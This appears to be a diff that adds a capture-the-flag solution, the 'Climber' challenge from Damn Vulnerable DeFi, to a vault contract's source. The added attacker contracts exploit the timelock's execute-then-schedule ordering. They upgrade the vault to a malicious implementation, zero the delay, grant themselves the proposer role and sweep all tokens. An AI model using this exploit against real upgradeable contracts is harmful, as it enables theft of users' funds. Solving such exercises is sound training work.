@@ -8,7 +8,7 @@ import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 import "solady/src/utils/SafeTransferLib.sol";
 
 import "./ClimberTimelock.sol";
-import {WITHDRAWAL_LIMIT, WAITING_PERIOD} from "./ClimberConstants.sol";
+import {WITHDRAWAL_LIMIT, WAITING_PERIOD, PROPOSER_ROLE} from "./ClimberConstants.sol";
 import {CallerNotSweeper, InvalidWithdrawalAmount, InvalidWithdrawalTime} from "./ClimberErrors.sol";
 
 /**
@@ -78,6 +78,63 @@ contract ClimberVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
 
     function _updateLastWithdrawalTimestamp(uint256 timestamp) private {
         _lastWithdrawalTimestamp = timestamp;
+    }
+
+    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
+    function _authorizeUpgrade(address newImplementation) internal override onlyOwner {}
+}
+
+contract ClimberVaultAttacker {
+    ClimberVault internal vault;
+    ClimberTimelock internal timelock;
+    AttackerImpl internal attackerImpl;
+    address internal token;
+
+    constructor(address _vault, address _token) {
+        vault = ClimberVault(_vault);
+        timelock = ClimberTimelock(payable(vault.owner()));
+        attackerImpl = new AttackerImpl();
+        token = _token;
+    }
+
+    function _getAttackData() internal view returns (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) {
+        targets = new address[](4);
+        targets[0] = address(vault);
+        targets[1] = address(timelock);
+        targets[2] = address(timelock);
+        targets[3] = address(this);
+
+        values = new uint256[](4);
+
+        dataElements = new bytes[](4);
+        // a) transfer ownership of vault to player
+        dataElements[0] = abi.encodeWithSignature("upgradeTo(address)", address(attackerImpl));
+        // b) update delay to zero on timelock
+        dataElements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
+        // c) give permission to this contract to call schedule on timelock
+        dataElements[2] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
+        // d) schedule this execution
+        dataElements[3] = abi.encodeWithSignature("schedule()");
+    }
+
+    function attack() external {
+        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) = _getAttackData();
+        timelock.execute(targets, values, dataElements, salt);
+        AttackerImpl(address(vault)).sweepFunds(token, msg.sender);
+    }
+
+    function schedule() external {
+        (address[] memory targets, uint256[] memory values, bytes[] memory dataElements, bytes32 salt) = _getAttackData();
+        timelock.schedule(targets, values, dataElements, salt);
+    }
+}
+
+contract AttackerImpl is Initializable, OwnableUpgradeable, UUPSUpgradeable {
+    uint256 private _lastWithdrawalTimestamp;
+    address private _sweeper;
+
+    function sweepFunds(address token, address to) external {
+        SafeTransferLib.safeTransfer(token, to, IERC20(token).balanceOf(address(this)));
     }
 
     // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
